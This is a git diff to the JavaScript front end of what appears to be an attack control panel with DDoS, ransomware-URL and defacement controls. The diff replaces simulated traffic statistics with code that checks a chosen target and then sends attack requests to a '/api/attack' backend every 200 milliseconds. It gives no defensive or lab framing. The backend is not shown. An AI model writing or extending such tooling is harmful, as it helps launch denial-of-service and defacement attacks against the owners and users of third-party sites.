@@ -14,10 +14,29 @@ document.addEventListener('DOMContentLoaded', () => {
   const ransomwareUrlInput = document.getElementById('ransomwareUrl');
   const sidePanel = document.querySelector('.side-panel');
   const menuButton = document.getElementById('menuButton');
+  const tabs = document.querySelectorAll('.side-panel-tab');
+  const tabContents = document.querySelectorAll('.tab-content');
 
   let mbps = 0;
   let packetsSent = 0;
   let connectionStatus = 'Idle';
+  let attackInterval;
+
+  function showTab(tabId) {
+    tabContents.forEach(content => {
+      content.style.display = 'none';
+    });
+    document.getElementById(tabId).style.display = 'block';
+  }
+
+  tabs.forEach(tab => {
+    tab.addEventListener('click', (event) => {
+      const tabId = event.target.dataset.tab;
+      showTab(tabId);
+    });
+  });
+
+  showTab('ddos');
 
   function logMessage(message) {
     const logEntry = document.createElement('div');
@@ -34,21 +53,61 @@ document.addEventListener('DOMContentLoaded', () => {
     `;
   }
 
-  function simulateAttackStats(attackType) {
-    const interval = setInterval(() => {
-      if (connectionStatus !== 'Attacking') {
-        clearInterval(interval);
-        return;
-      }
+  async function testConnection(url) {
+    try {
+      const response = await fetch(url, { method: 'HEAD', mode: 'no-cors' });
+      return response.status >= 200 && response.status < 400;
+    } catch (error) {
+      return false;
+    }
+  }
 
-      const randomMBPS = Math.random() * 5 + (attackType === 'SYN Flood' ? 5 : attackType === 'UDP Flood' ? 8 : 2);
-      const randomPackets = Math.floor(Math.random() * 100 + (attackType === 'SYN Flood' ? 200 : attackType === 'UDP Flood' ? 300 : 50));
+  async function initiateAttack(targetUrl, attackType) {
+    connectionStatus = 'Attacking';
+    statusDiv.textContent = 'Attacking...';
+    logMessage(`Initiating ${attackType} attack on ${targetUrl}`);
 
-      mbps += randomMBPS;
-      packetsSent += randomPackets;
-
+    const isReachable = await testConnection(targetUrl);
+    if (!isReachable) {
+      logMessage(`Target ${targetUrl} is unreachable. Attack aborted.`);
+      statusDiv.textContent = 'Target Unreachable';
+      connectionStatus = 'Idle';
       updateStatsDisplay();
-    }, 500);
+      return;
+    }
+
+    attackInterval = setInterval(async () => {
+      try {
+        const response = await fetch('/api/attack', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ targetUrl, attackType }),
+        });
+
+        const data = await response.json();
+
+        if (response.ok) {
+          mbps += data.mbps;
+          packetsSent += data.packetsSent;
+          updateStatsDisplay();
+          logMessage(data.message);
+        } else {
+          logMessage(`Attack failed: ${data.error}`);
+          clearInterval(attackInterval);
+          connectionStatus = 'Idle';
+          statusDiv.textContent = 'Attack Failed';
+          updateStatsDisplay();
+        }
+      } catch (error) {
+        logMessage(`An error occurred during the attack: ${error.message}`);
+        clearInterval(attackInterval);
+        connectionStatus = 'Idle';
+        statusDiv.textContent = 'Attack Error';
+        updateStatsDisplay();
+      }
+    }, 200);
   }
 
   attackButton.addEventListener('click', async () => {
@@ -60,37 +119,12 @@ document.addEventListener('DOMContentLoaded', () => {
       return;
     }
 
-    connectionStatus = 'Attacking';
-    statusDiv.textContent = 'Attacking...';
-    logMessage(`Initiating ${attackType} attack on ${targetUrl}`);
+    clearInterval(attackInterval);
+    mbps = 0;
+    packetsSent = 0;
+    updateStatsDisplay();
 
-    simulateAttackStats(attackType);
-
-    try {
-      const response = await fetch('/api/attack', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({ targetUrl, attackType }),
-      });
-
-      const data = await response.json();
-
-      if (response.ok) {
-        statusDiv.textContent = data.message;
-        logMessage(data.message);
-      } else {
-        statusDiv.textContent = `Error: ${data.error}`;
-        logMessage(`Error: ${data.error}`);
-      }
-    } catch (error) {
-      statusDiv.textContent = `An error occurred: ${error.message}`;
-      logMessage(`An error occurred: ${error.message}`);
-    } finally {
-      connectionStatus = 'Idle';
-      statusDiv.textContent = 'Idle';
-    }
+    initiateAttack(targetUrl, attackType);
   });
 
   defaceButton.addEventListener('click', async () => {
